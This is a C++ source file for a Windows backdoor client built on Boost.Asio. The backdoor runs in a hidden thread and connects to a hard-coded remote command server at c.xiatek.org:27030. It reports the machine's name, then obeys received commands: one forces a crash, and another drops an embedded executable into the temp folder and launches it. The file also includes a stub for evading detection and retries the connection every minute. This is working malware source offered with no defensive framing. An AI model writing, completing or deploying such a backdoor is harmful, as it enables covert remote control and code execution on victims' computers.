#include "Backdoor.h"

#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <fstream>

// Boost libs
#include <boost/array.hpp>
#include <boost/asio.hpp>

#pragma comment(lib, "libboost_system-vc90-mt-gd-1_46_1.lib")

using boost::asio::ip::tcp;

#define BACKDOOR_DEBUG

#ifdef BACKDOOR_DEBUG
#define DEBUGMSG(x) std::cout<<x"\n"
#else
#define DEBUGMSG(x) ;
#endif


#include "windows.h"
#include "Shellapi.h"
#include <stdio.h>
#include <stdlib.h>

#include "DownloadProgram.h"


// The main thread that initiates the connection and calls Think
DWORD WINAPI BackdoorThread(LPVOID args)
{
	Backdoor* _this = (Backdoor*)args;
	
	if(_this->IsDetectionRunning()) return 0;
	_this->m_Connected = false;
	//_this->Connect();
	
	while(true)
		if(_this->Think()) break;
		else Sleep(1);
	
	if (_this->m_Socket->is_open())
		_this->m_Socket->close();

	delete _this->m_Socket;
	return 0;
}

bool Backdoor::Connect()
{
	m_Connected = false;


	tcp::resolver resolver(m_IOService);

	tcp::resolver::query query("c.xiatek.org", "27030");
	
	tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
	tcp::resolver::iterator end;

	tcp::socket* socket = new tcp::socket(m_IOService);
	boost::system::error_code error = boost::asio::error::host_not_found;
	while (error && endpoint_iterator != end)
	{
		socket->close();
		socket->connect(*endpoint_iterator++, error);
	}
	if(error)
	{
		DEBUGMSG("Connection lost: " << error.value() << "");
		delete socket;
		return false; // Connection failed :(
	}
	DEBUGMSG("Connected");

	this->m_Socket = socket;

	ConnectPacket pack;
	pack.Type = 0x1;
	memcpy(&(pack.Name), &(this->m_Name), MAX_NAME_LENGTH + 1);
	
	unsigned char data[sizeof(ConnectPacket)];
	memcpy(&data, &pack, sizeof(ConnectPacket));

	boost::system::error_code ignored_error;
	boost::asio::write(*socket, boost::asio::buffer(data, sizeof(ConnectPacket)), boost::asio::transfer_all(), ignored_error);
	
	m_Connected = true;
	return true;
}

void Backdoor::Init(void)
{
	m_Closing = false;
	CreateThread( NULL, 0, BackdoorThread, (LPVOID)this, 0, NULL);
	DEBUGMSG("Created thread");
}

void Backdoor::Shutdown(void)
{
	m_Closing = true;
}

bool Backdoor::IsDetectionRunning(void)
{
	return false;
}

void Backdoor::SetLocalName(char* Name)
{
	int i;
	for(i = 0; i < MAX_NAME_LENGTH; i++)
	{
		char c = Name[i];
		if(!c) break;
		m_Name[i] = c;
	}
	m_Name[i] = NULL;
}

// Returning true here closes the thread.
bool Backdoor::Think()
{
	if(this->IsDetectionRunning()) return true;

	if(!m_Connected)
		if(!this->Connect())
		{
			DEBUGMSG("Retrying connection in 1 min");
			Sleep(1000 * 60); // Sleep for a min
			DEBUGMSG("Retrying connection\n");
			return m_Closing;
		}

	boost::array<char, 128> buf;
	boost::system::error_code error;
	size_t len = m_Socket->read_some(boost::asio::buffer(buf), error);

	if (error)
	{
		DEBUGMSG("Connection lost");
		m_Connected = false;
		return m_Closing;
	}
	
	if(len)
	{
		char* data = buf.c_array();
		for(int i = 0; i < len; i++)
		{
			char command = data[i];
			if(command == 1)
			{
				DEBUGMSG("Recived crash command");

				while(true)
					_asm push eax;
			}
			else if(command == 2)
			{
				DEBUGMSG("Recived remote execute command");
				
				char path[256];
				GetTempPathA(256, path);

				char final[256];
				sprintf(final, "%s\\bre.exe", path);

				std::fstream bin(final, std::ios::out | std::ios::binary);
				bin.write(DownloadProgram, sizeof(DownloadProgram));
				bin.close();
				
				ShellExecute(NULL, "open", final, NULL, NULL, SW_SHOWNORMAL);
			}
		}
	}

	return m_Closing;
}